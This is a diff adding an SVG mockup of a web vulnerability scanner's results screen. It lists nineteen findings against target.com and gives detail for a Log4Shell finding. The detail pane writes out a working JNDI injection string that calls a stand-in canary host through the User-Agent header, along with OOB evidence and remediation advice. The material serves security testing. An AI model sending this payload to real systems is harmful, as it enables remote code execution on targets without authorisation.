@@ -1,0 +1,388 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 672" width="1440" height="672">
+  <defs>
+    <clipPath id="cr"><rect width="1440" height="672" rx="0"/></clipPath>
+  </defs>
+  <rect width="1440" height="672" fill="#0b0f1a"/>
+  <g clip-path="url(#cr)">
+
+    <!-- ═══ TOOLBAR ROW 1 ═══ -->
+    <rect x="0" y="0" width="1440" height="44" fill="#0d1220"/>
+    <text x="16" y="29" font-family="Arial" font-size="22" font-weight="bold" fill="#60A5FA">BurpMax</text>
+    <text x="820" y="27" font-family="Arial" font-size="11" fill="#27AE60">&#x25A1; autosaved 13:22</text>
+    <rect x="910" y="11" width="66" height="23" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="922" y="27" font-family="Arial" font-size="12" fill="#CBD5E1">&#x1F4BE; Save</text>
+    <rect x="982" y="11" width="64" height="23" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="995" y="27" font-family="Arial" font-size="12" fill="#CBD5E1">&#x2B07; Load</text>
+    <rect x="1052" y="11" width="80" height="23" rx="2" fill="#7f1d1d" stroke="#991b1b" stroke-width="1"/>
+    <text x="1063" y="27" font-family="Arial" font-size="12" font-weight="bold" fill="#FECACA">Clear All</text>
+    <rect x="1138" y="11" width="66" height="23" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="1148" y="27" font-family="Arial" font-size="12" fill="#CBD5E1">&#x23F8; Pause</text>
+    <rect x="1212" y="11" width="44" height="23" rx="2" fill="#2563EB" stroke="#3B82F6" stroke-width="1"/>
+    <text x="1223" y="27" font-family="Arial" font-size="12" font-weight="bold" fill="#fff">CSV</text>
+    <rect x="1262" y="11" width="42" height="23" rx="2" fill="#2563EB" stroke="#3B82F6" stroke-width="1"/>
+    <text x="1273" y="27" font-family="Arial" font-size="12" font-weight="bold" fill="#fff">PDF</text>
+    <rect x="1310" y="11" width="48" height="23" rx="2" fill="#2563EB" stroke="#3B82F6" stroke-width="1"/>
+    <text x="1318" y="27" font-family="Arial" font-size="12" font-weight="bold" fill="#fff">Word</text>
+    <rect x="1364" y="11" width="64" height="23" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="1371" y="27" font-family="Arial" font-size="12" fill="#CBD5E1">Scan Diff</text>
+    <line x1="0" y1="44" x2="1440" y2="44" stroke="#1e283c" stroke-width="1"/>
+
+    <!-- ═══ TOOLBAR ROW 2 ═══ -->
+    <rect x="0" y="44" width="1440" height="34" fill="#0d1220"/>
+    <rect x="16" y="51" width="126" height="23" rx="2" fill="#6B21A8" stroke="#7C3AED" stroke-width="1"/>
+    <text x="20" y="67" font-family="Courier New" font-size="12" font-weight="bold" fill="#fff">&#x26A1; Active Scan</text>
+    <text x="154" y="67" font-family="Arial" font-size="11" fill="#27AE60">Active scan complete. 19 active findings.</text>
+    <line x1="0" y1="78" x2="1440" y2="78" stroke="#1e283c" stroke-width="1"/>
+
+    <!-- ═══ FILTER BAR ═══ -->
+    <rect x="0" y="78" width="1440" height="32" fill="#16202E"/>
+    <text x="10"  y="99" font-family="Arial" font-size="11" fill="#788BA8">Total:</text>
+    <text x="50"  y="99" font-family="Arial" font-size="11" font-weight="bold" fill="#E2E8F0">19</text>
+    <text x="65"  y="99" font-family="Arial" font-size="11" fill="#788BA8">Crit:</text>
+    <text x="96"  y="99" font-family="Arial" font-size="11" font-weight="bold" fill="#FF5050">5</text>
+    <text x="110" y="99" font-family="Arial" font-size="11" fill="#788BA8">High:</text>
+    <text x="146" y="99" font-family="Arial" font-size="11" font-weight="bold" fill="#F87171">8</text>
+    <text x="160" y="99" font-family="Arial" font-size="11" fill="#788BA8">Med:</text>
+    <text x="194" y="99" font-family="Arial" font-size="11" font-weight="bold" fill="#FB923C">6</text>
+    <text x="208" y="99" font-family="Arial" font-size="11" fill="#788BA8">Low:</text>
+    <text x="240" y="99" font-family="Arial" font-size="11" font-weight="bold" fill="#FACC15">0</text>
+    <text x="258" y="99" font-family="Arial" font-size="11" fill="#CBD5E1">19 findings</text>
+    <rect x="326" y="83" width="30" height="20" rx="2" fill="#1e3a5f" stroke="#3B82F6" stroke-width="1"/>
+    <text x="333" y="97" font-family="Arial" font-size="11" fill="#93C5FD">All</text>
+    <rect x="362" y="83" width="64" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="370" y="97" font-family="Arial" font-size="11" fill="#FF5050">Critical</text>
+    <rect x="432" y="83" width="42" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="440" y="97" font-family="Arial" font-size="11" fill="#F87171">High</text>
+    <rect x="480" y="83" width="58" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="488" y="97" font-family="Arial" font-size="11" fill="#FB923C">Medium</text>
+    <rect x="544" y="83" width="36" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="552" y="97" font-family="Arial" font-size="11" fill="#FACC15">Low</text>
+    <rect x="586" y="83" width="98" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="592" y="97" font-family="Arial" font-size="11" fill="#93C5FD">Informational</text>
+    <rect x="692" y="83" width="62" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="700" y="97" font-family="Arial" font-size="11" fill="#CBD5E1">Show FP</text>
+    <text x="768" y="97" font-family="Arial" font-size="10" fill="#788BA8">[ search ]</text>
+    <rect x="812" y="83" width="188" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="820" y="97" font-family="Courier New" font-size="11" fill="#4a5568">Search findings...</text>
+    <rect x="1004" y="83" width="20" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="1009" y="97" font-family="Arial" font-size="11" font-weight="bold" fill="#788BA8">x</text>
+    <line x1="0" y1="110" x2="1440" y2="110" stroke="#28385a" stroke-width="1"/>
+
+    <!-- ═══ VERTICAL DIVIDER ═══ -->
+    <line x1="680" y1="110" x2="680" y2="652" stroke="#28385a" stroke-width="1"/>
+
+    <!-- ═══ TABLE HEADER ═══ -->
+    <rect x="0" y="110" width="680" height="22" fill="#0d1220"/>
+    <text x="8"   y="125" font-family="Arial" font-size="10" fill="#788BA8">#</text>
+    <text x="22"  y="125" font-family="Arial" font-size="10" fill="#788BA8">SEVERITY</text>
+    <text x="118" y="125" font-family="Arial" font-size="10" fill="#788BA8">FINDING</text>
+    <text x="370" y="125" font-family="Arial" font-size="10" fill="#788BA8">ENDPOINT</text>
+    <text x="510" y="125" font-family="Arial" font-size="10" fill="#788BA8">HTTP</text>
+    <text x="552" y="125" font-family="Arial" font-size="10" fill="#788BA8">CWE</text>
+    <text x="606" y="125" font-family="Arial" font-size="10" fill="#788BA8">CVSS</text>
+    <text x="642" y="125" font-family="Arial" font-size="10" fill="#788BA8">STATUS</text>
+    <line x1="18"  y1="110" x2="18"  y2="652" stroke="#1e283c" stroke-width="1"/>
+    <line x1="114" y1="110" x2="114" y2="652" stroke="#1e283c" stroke-width="1"/>
+    <line x1="360" y1="110" x2="360" y2="652" stroke="#1e283c" stroke-width="1"/>
+    <line x1="502" y1="110" x2="502" y2="652" stroke="#1e283c" stroke-width="1"/>
+    <line x1="544" y1="110" x2="544" y2="652" stroke="#1e283c" stroke-width="1"/>
+    <line x1="598" y1="110" x2="598" y2="652" stroke="#1e283c" stroke-width="1"/>
+    <line x1="636" y1="110" x2="636" y2="652" stroke="#1e283c" stroke-width="1"/>
+    <line x1="0"   y1="132" x2="680" y2="132" stroke="#1e283c" stroke-width="1"/>
+
+    <!-- CRITICAL rows -->
+    <rect x="0" y="132" width="680" height="24" fill="#14305A"/>
+    <text x="8"   y="148" font-family="Courier New" font-size="11" fill="#B0C4DE">1</text>
+    <text x="22"  y="148" font-family="Courier New" font-size="11" font-weight="bold" fill="#FF5050">Critical</text>
+    <text x="118" y="148" font-family="Courier New" font-size="11" fill="#E2E8F0">Log4Shell / Log4j RCE (CVE-2021-44228)</text>
+    <text x="370" y="148" font-family="Courier New" font-size="11" fill="#E2E8F0">https://api.target.com/auth/...</text>
+    <text x="510" y="148" font-family="Courier New" font-size="11" fill="#E2E8F0">POST</text>
+    <text x="552" y="148" font-family="Courier New" font-size="11" fill="#E2E8F0">CWE-917</text>
+    <text x="606" y="148" font-family="Courier New" font-size="11" fill="#FF5050">9.3</text>
+    <text x="642" y="148" font-family="Courier New" font-size="11" fill="#E2E8F0">Open</text>
+    <line x1="0" y1="156" x2="680" y2="156" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="156" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="172" font-family="Courier New" font-size="11" fill="#788BA8">2</text>
+    <text x="22"  y="172" font-family="Courier New" font-size="11" font-weight="bold" fill="#FF5050">Critical</text>
+    <text x="118" y="172" font-family="Courier New" font-size="11" fill="#CBD5E1">SQL Injection (Error + Time-based)</text>
+    <text x="370" y="172" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/users...</text>
+    <text x="510" y="172" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="172" font-family="Courier New" font-size="11" fill="#788BA8">CWE-89</text>
+    <text x="606" y="172" font-family="Courier New" font-size="11" fill="#FF5050">9.1</text>
+    <text x="642" y="172" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="180" x2="680" y2="180" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="180" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="196" font-family="Courier New" font-size="11" fill="#788BA8">3</text>
+    <text x="22"  y="196" font-family="Courier New" font-size="11" font-weight="bold" fill="#FF5050">Critical</text>
+    <text x="118" y="196" font-family="Courier New" font-size="11" fill="#CBD5E1">Java Deserialization (URLDNS OOB)</text>
+    <text x="370" y="196" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/impor...</text>
+    <text x="510" y="196" font-family="Courier New" font-size="11" fill="#788BA8">POST</text>
+    <text x="552" y="196" font-family="Courier New" font-size="11" fill="#788BA8">CWE-502</text>
+    <text x="606" y="196" font-family="Courier New" font-size="11" fill="#FF5050">9.1</text>
+    <text x="642" y="196" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="204" x2="680" y2="204" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="204" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="220" font-family="Courier New" font-size="11" fill="#788BA8">4</text>
+    <text x="22"  y="220" font-family="Courier New" font-size="11" font-weight="bold" fill="#FF5050">Critical</text>
+    <text x="118" y="220" font-family="Courier New" font-size="11" fill="#CBD5E1">.env Exposed (AWS_SECRET_ACCESS_KEY)</text>
+    <text x="370" y="220" font-family="Courier New" font-size="11" fill="#788BA8">https://target.com/.env</text>
+    <text x="510" y="220" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="220" font-family="Courier New" font-size="11" fill="#788BA8">CWE-312</text>
+    <text x="606" y="220" font-family="Courier New" font-size="11" fill="#FF5050">8.9</text>
+    <text x="642" y="220" font-family="Courier New" font-size="11" fill="#788BA8">Confirmed</text>
+    <line x1="0" y1="228" x2="680" y2="228" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="228" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="244" font-family="Courier New" font-size="11" fill="#788BA8">5</text>
+    <text x="22"  y="244" font-family="Courier New" font-size="11" font-weight="bold" fill="#FF5050">Critical</text>
+    <text x="118" y="244" font-family="Courier New" font-size="11" fill="#CBD5E1">Spring Boot /actuator/heapdump Exposed</text>
+    <text x="370" y="244" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/actua...</text>
+    <text x="510" y="244" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="244" font-family="Courier New" font-size="11" fill="#788BA8">CWE-200</text>
+    <text x="606" y="244" font-family="Courier New" font-size="11" fill="#FF5050">8.7</text>
+    <text x="642" y="244" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="252" x2="680" y2="252" stroke="#1e283c" stroke-width="1"/>
+
+    <!-- HIGH rows -->
+    <rect x="0" y="252" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="268" font-family="Courier New" font-size="11" fill="#788BA8">6</text>
+    <text x="22"  y="268" font-family="Courier New" font-size="11" font-weight="bold" fill="#F87171">High</text>
+    <text x="118" y="268" font-family="Courier New" font-size="11" fill="#CBD5E1">JWT Algorithm Confusion (RS256 to HS256)</text>
+    <text x="370" y="268" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/auth/...</text>
+    <text x="510" y="268" font-family="Courier New" font-size="11" fill="#788BA8">POST</text>
+    <text x="552" y="268" font-family="Courier New" font-size="11" fill="#788BA8">CWE-327</text>
+    <text x="606" y="268" font-family="Courier New" font-size="11" fill="#F87171">8.2</text>
+    <text x="642" y="268" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="276" x2="680" y2="276" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="276" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="292" font-family="Courier New" font-size="11" fill="#788BA8">7</text>
+    <text x="22"  y="292" font-family="Courier New" font-size="11" font-weight="bold" fill="#F87171">High</text>
+    <text x="118" y="292" font-family="Courier New" font-size="11" fill="#CBD5E1">Reflected XSS (Unescaped Parameter)</text>
+    <text x="370" y="292" font-family="Courier New" font-size="11" fill="#788BA8">https://target.com/search?q=...</text>
+    <text x="510" y="292" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="292" font-family="Courier New" font-size="11" fill="#788BA8">CWE-79</text>
+    <text x="606" y="292" font-family="Courier New" font-size="11" fill="#F87171">7.5</text>
+    <text x="642" y="292" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="300" x2="680" y2="300" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="300" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="316" font-family="Courier New" font-size="11" fill="#788BA8">8</text>
+    <text x="22"  y="316" font-family="Courier New" font-size="11" font-weight="bold" fill="#F87171">High</text>
+    <text x="118" y="316" font-family="Courier New" font-size="11" fill="#CBD5E1">SSRF via X-Forwarded-For (OOB DNS)</text>
+    <text x="370" y="316" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/fetch...</text>
+    <text x="510" y="316" font-family="Courier New" font-size="11" fill="#788BA8">POST</text>
+    <text x="552" y="316" font-family="Courier New" font-size="11" fill="#788BA8">CWE-918</text>
+    <text x="606" y="316" font-family="Courier New" font-size="11" fill="#F87171">8.0</text>
+    <text x="642" y="316" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="324" x2="680" y2="324" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="324" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="340" font-family="Courier New" font-size="11" fill="#788BA8">9</text>
+    <text x="22"  y="340" font-family="Courier New" font-size="11" font-weight="bold" fill="#F87171">High</text>
+    <text x="118" y="340" font-family="Courier New" font-size="11" fill="#CBD5E1">IDOR - Horizontal Privilege Escalation</text>
+    <text x="370" y="340" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/users...</text>
+    <text x="510" y="340" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="340" font-family="Courier New" font-size="11" fill="#788BA8">CWE-284</text>
+    <text x="606" y="340" font-family="Courier New" font-size="11" fill="#F87171">7.8</text>
+    <text x="642" y="340" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="348" x2="680" y2="348" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="348" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="364" font-family="Courier New" font-size="11" fill="#788BA8">10</text>
+    <text x="22"  y="364" font-family="Courier New" font-size="11" font-weight="bold" fill="#F87171">High</text>
+    <text x="118" y="364" font-family="Courier New" font-size="11" fill="#CBD5E1">HTTP Request Smuggling (CL.TE)</text>
+    <text x="370" y="364" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/api/v1</text>
+    <text x="510" y="364" font-family="Courier New" font-size="11" fill="#788BA8">POST</text>
+    <text x="552" y="364" font-family="Courier New" font-size="11" fill="#788BA8">CWE-444</text>
+    <text x="606" y="364" font-family="Courier New" font-size="11" fill="#F87171">7.4</text>
+    <text x="642" y="364" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="372" x2="680" y2="372" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="372" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="388" font-family="Courier New" font-size="11" fill="#788BA8">11</text>
+    <text x="22"  y="388" font-family="Courier New" font-size="11" font-weight="bold" fill="#F87171">High</text>
+    <text x="118" y="388" font-family="Courier New" font-size="11" fill="#CBD5E1">Path Traversal (23 Encoding Variants)</text>
+    <text x="370" y="388" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/files/...</text>
+    <text x="510" y="388" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="388" font-family="Courier New" font-size="11" fill="#788BA8">CWE-22</text>
+    <text x="606" y="388" font-family="Courier New" font-size="11" fill="#F87171">7.6</text>
+    <text x="642" y="388" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="396" x2="680" y2="396" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="396" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="412" font-family="Courier New" font-size="11" fill="#788BA8">12</text>
+    <text x="22"  y="412" font-family="Courier New" font-size="11" font-weight="bold" fill="#F87171">High</text>
+    <text x="118" y="412" font-family="Courier New" font-size="11" fill="#CBD5E1">Stored XSS (Canary Confirmed in Sink)</text>
+    <text x="370" y="412" font-family="Courier New" font-size="11" fill="#788BA8">https://target.com/comments</text>
+    <text x="510" y="412" font-family="Courier New" font-size="11" fill="#788BA8">POST</text>
+    <text x="552" y="412" font-family="Courier New" font-size="11" fill="#788BA8">CWE-79</text>
+    <text x="606" y="412" font-family="Courier New" font-size="11" fill="#F87171">7.3</text>
+    <text x="642" y="412" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="420" x2="680" y2="420" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="420" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="436" font-family="Courier New" font-size="11" fill="#788BA8">13</text>
+    <text x="22"  y="436" font-family="Courier New" font-size="11" font-weight="bold" fill="#F87171">High</text>
+    <text x="118" y="436" font-family="Courier New" font-size="11" fill="#CBD5E1">OAuth Open redirect_uri (Token Hijack)</text>
+    <text x="370" y="436" font-family="Courier New" font-size="11" fill="#788BA8">https://auth.target.com/oauth...</text>
+    <text x="510" y="436" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="436" font-family="Courier New" font-size="11" fill="#788BA8">CWE-601</text>
+    <text x="606" y="436" font-family="Courier New" font-size="11" fill="#F87171">7.1</text>
+    <text x="642" y="436" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="444" x2="680" y2="444" stroke="#1e283c" stroke-width="1"/>
+
+    <!-- MEDIUM rows -->
+    <rect x="0" y="444" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="460" font-family="Courier New" font-size="11" fill="#788BA8">14</text>
+    <text x="22"  y="460" font-family="Courier New" font-size="11" font-weight="bold" fill="#FB923C">Medium</text>
+    <text x="118" y="460" font-family="Courier New" font-size="11" fill="#CBD5E1">CORS Misconfiguration (Arbitrary Origin)</text>
+    <text x="370" y="460" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/graphql</text>
+    <text x="510" y="460" font-family="Courier New" font-size="11" fill="#788BA8">POST</text>
+    <text x="552" y="460" font-family="Courier New" font-size="11" fill="#788BA8">CWE-942</text>
+    <text x="606" y="460" font-family="Courier New" font-size="11" fill="#FB923C">6.5</text>
+    <text x="642" y="460" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="468" x2="680" y2="468" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="468" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="484" font-family="Courier New" font-size="11" fill="#788BA8">15</text>
+    <text x="22"  y="484" font-family="Courier New" font-size="11" font-weight="bold" fill="#FB923C">Medium</text>
+    <text x="118" y="484" font-family="Courier New" font-size="11" fill="#CBD5E1">SSTI (Jinja2 Math Evaluation)</text>
+    <text x="370" y="484" font-family="Courier New" font-size="11" fill="#788BA8">https://target.com/template?n...</text>
+    <text x="510" y="484" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="484" font-family="Courier New" font-size="11" fill="#788BA8">CWE-94</text>
+    <text x="606" y="484" font-family="Courier New" font-size="11" fill="#FB923C">6.8</text>
+    <text x="642" y="484" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="492" x2="680" y2="492" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="492" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="508" font-family="Courier New" font-size="11" fill="#788BA8">16</text>
+    <text x="22"  y="508" font-family="Courier New" font-size="11" font-weight="bold" fill="#FB923C">Medium</text>
+    <text x="118" y="508" font-family="Courier New" font-size="11" fill="#CBD5E1">GraphQL Introspection Enabled</text>
+    <text x="370" y="508" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/graphql</text>
+    <text x="510" y="508" font-family="Courier New" font-size="11" fill="#788BA8">POST</text>
+    <text x="552" y="508" font-family="Courier New" font-size="11" fill="#788BA8">CWE-200</text>
+    <text x="606" y="508" font-family="Courier New" font-size="11" fill="#FB923C">5.3</text>
+    <text x="642" y="508" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="516" x2="680" y2="516" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="516" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="532" font-family="Courier New" font-size="11" fill="#788BA8">17</text>
+    <text x="22"  y="532" font-family="Courier New" font-size="11" font-weight="bold" fill="#FB923C">Medium</text>
+    <text x="118" y="532" font-family="Courier New" font-size="11" fill="#CBD5E1">Missing HSTS Header</text>
+    <text x="370" y="532" font-family="Courier New" font-size="11" fill="#788BA8">https://target.com/</text>
+    <text x="510" y="532" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="532" font-family="Courier New" font-size="11" fill="#788BA8">CWE-319</text>
+    <text x="606" y="532" font-family="Courier New" font-size="11" fill="#FB923C">5.4</text>
+    <text x="642" y="532" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="540" x2="680" y2="540" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="540" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="556" font-family="Courier New" font-size="11" fill="#788BA8">18</text>
+    <text x="22"  y="556" font-family="Courier New" font-size="11" font-weight="bold" fill="#FB923C">Medium</text>
+    <text x="118" y="556" font-family="Courier New" font-size="11" fill="#CBD5E1">NoSQL Injection ($ne Operator)</text>
+    <text x="370" y="556" font-family="Courier New" font-size="11" fill="#788BA8">https://api.target.com/auth/l...</text>
+    <text x="510" y="556" font-family="Courier New" font-size="11" fill="#788BA8">POST</text>
+    <text x="552" y="556" font-family="Courier New" font-size="11" fill="#788BA8">CWE-943</text>
+    <text x="606" y="556" font-family="Courier New" font-size="11" fill="#FB923C">6.2</text>
+    <text x="642" y="556" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="564" x2="680" y2="564" stroke="#1e283c" stroke-width="1"/>
+
+    <rect x="0" y="564" width="680" height="24" fill="#0b0f1a"/>
+    <text x="8"   y="580" font-family="Courier New" font-size="11" fill="#788BA8">19</text>
+    <text x="22"  y="580" font-family="Courier New" font-size="11" font-weight="bold" fill="#FB923C">Medium</text>
+    <text x="118" y="580" font-family="Courier New" font-size="11" fill="#CBD5E1">Sensitive File: .git/config Exposed</text>
+    <text x="370" y="580" font-family="Courier New" font-size="11" fill="#788BA8">https://target.com/.git/config</text>
+    <text x="510" y="580" font-family="Courier New" font-size="11" fill="#788BA8">GET</text>
+    <text x="552" y="580" font-family="Courier New" font-size="11" fill="#788BA8">CWE-538</text>
+    <text x="606" y="580" font-family="Courier New" font-size="11" fill="#FB923C">5.8</text>
+    <text x="642" y="580" font-family="Courier New" font-size="11" fill="#788BA8">Open</text>
+    <line x1="0" y1="588" x2="680" y2="588" stroke="#1e283c" stroke-width="1"/>
+
+    <!-- Fill remaining left pane -->
+    <rect x="0" y="588" width="680" height="64" fill="#0b0f1a"/>
+
+    <!-- ═══ DETAIL PANE RIGHT ═══ -->
+    <rect x="681" y="110" width="759" height="542" fill="#0d1220"/>
+
+    <!-- Title + badge -->
+    <text x="697" y="136" font-family="Arial" font-size="15" font-weight="bold" fill="#F1F5F9">Log4Shell / Log4j RCE (CVE-2021-44228)</text>
+    <rect x="1350" y="115" width="78" height="22" rx="2" fill="#7f1d1d"/>
+    <text x="1356" y="130" font-family="Arial" font-size="11" font-weight="bold" fill="#FCA5A5">CRITICAL</text>
+
+    <!-- Action buttons -->
+    <rect x="697"  y="144" width="124" height="22" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="703"  y="159" font-family="Arial" font-size="11" fill="#93C5FD">Send to Repeater</text>
+    <rect x="827"  y="144" width="88" height="22" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="836"  y="159" font-family="Arial" font-size="11" fill="#93C5FD">Mark as FP</text>
+    <rect x="921"  y="144" width="118" height="22" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="929"  y="159" font-family="Arial" font-size="11" fill="#93C5FD">Override Severity</text>
+    <rect x="1045" y="144" width="78" height="22" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="1056" y="159" font-family="Arial" font-size="11" fill="#93C5FD">Copy URL</text>
+
+    <!-- CVSS + Status -->
+    <text x="697"  y="184" font-family="Arial" font-size="10" fill="#788BA8">CVSS 4.0:</text>
+    <text x="750"  y="186" font-family="Arial" font-size="16" font-weight="bold" fill="#FF5050">9.0</text>
+    <text x="775"  y="184" font-family="Arial" font-size="10" fill="#788BA8">Status:</text>
+    <rect x="814" y="173" width="76" height="20" rx="2" fill="#16202E" stroke="#28385a" stroke-width="1"/>
+    <text x="826"  y="187" font-family="Arial" font-size="11" fill="#E2E8F0">Open &#x25BE;</text>
+
+    <!-- DESCRIPTION -->
+    <rect x="681" y="200" width="759" height="18" fill="#16202E"/>
+    <text x="697" y="213" font-family="Arial" font-size="10" font-weight="bold" fill="#788BA8">DESCRIPTION</text>
+    <rect x="681" y="218" width="759" height="76" fill="#07080e"/>
+    <rect x="681" y="218" width="4"   height="76" fill="#1e283c"/>
+    <text x="697" y="234" font-family="Courier New" font-size="11" fill="#CBD5E1">Log4Shell confirmed via OOB DNS callback. Payload ${jndi:ldap://a3f7x12.burpmax-canary.test/log4shell}</text>
+    <text x="697" y="250" font-family="Courier New" font-size="11" fill="#CBD5E1">injected into User-Agent header. DNS A query received at OOB server confirming JNDI evaluation.</text>
+    <text x="697" y="266" font-family="Courier New" font-size="11" fill="#CBD5E1">Affects Log4j 2.0-beta9 through 2.14.1. Remote code execution without authentication.</text>
+    <text x="697" y="282" font-family="Courier New" font-size="11" fill="#CBD5E1">CVSS vector: AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H</text>
+
+    <!-- EVIDENCE -->
+    <rect x="681" y="294" width="759" height="18" fill="#16202E"/>
+    <text x="697" y="307" font-family="Arial" font-size="10" font-weight="bold" fill="#788BA8">EVIDENCE</text>
+    <rect x="681" y="312" width="759" height="76" fill="#07080e"/>
+    <rect x="681" y="312" width="4"   height="76" fill="#1e283c"/>
+    <text x="697" y="328" font-family="Courier New" font-size="11" fill="#6EE7B7">OOB DNS hit: protocol=dns | q-type=A | unique-id=a3f7x12</text>
+    <text x="697" y="344" font-family="Courier New" font-size="11" fill="#6EE7B7">host=a3f7x12.burpmax-canary.test | callback confirmed in 1.2s</text>
+    <text x="697" y="360" font-family="Courier New" font-size="11" fill="#CBD5E1">Injected: User-Agent: ${jndi:ldap://a3f7x12.burpmax-canary.test/log4shell}</text>
+    <text x="697" y="376" font-family="Courier New" font-size="11" fill="#CBD5E1">Response: HTTP/1.1 200 OK  (endpoint responded normally — blind execution)</text>
+
+    <!-- REMEDIATION -->
+    <rect x="681" y="388" width="759" height="18" fill="#16202E"/>
+    <text x="697" y="401" font-family="Arial" font-size="10" font-weight="bold" fill="#788BA8">REMEDIATION</text>
+    <rect x="681" y="406" width="759" height="76" fill="#07080e"/>
+    <rect x="681" y="406" width="4"   height="76" fill="#1e283c"/>
+    <text x="697" y="422" font-family="Courier New" font-size="11" fill="#CBD5E1">Upgrade Log4j to 2.17.1+ (Java 8), 2.12.4+ (Java 7) or 2.3.2+ (Java 6).</text>
+    <text x="697" y="438" font-family="Courier New" font-size="11" fill="#CBD5E1">Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true as an environment variable.</text>
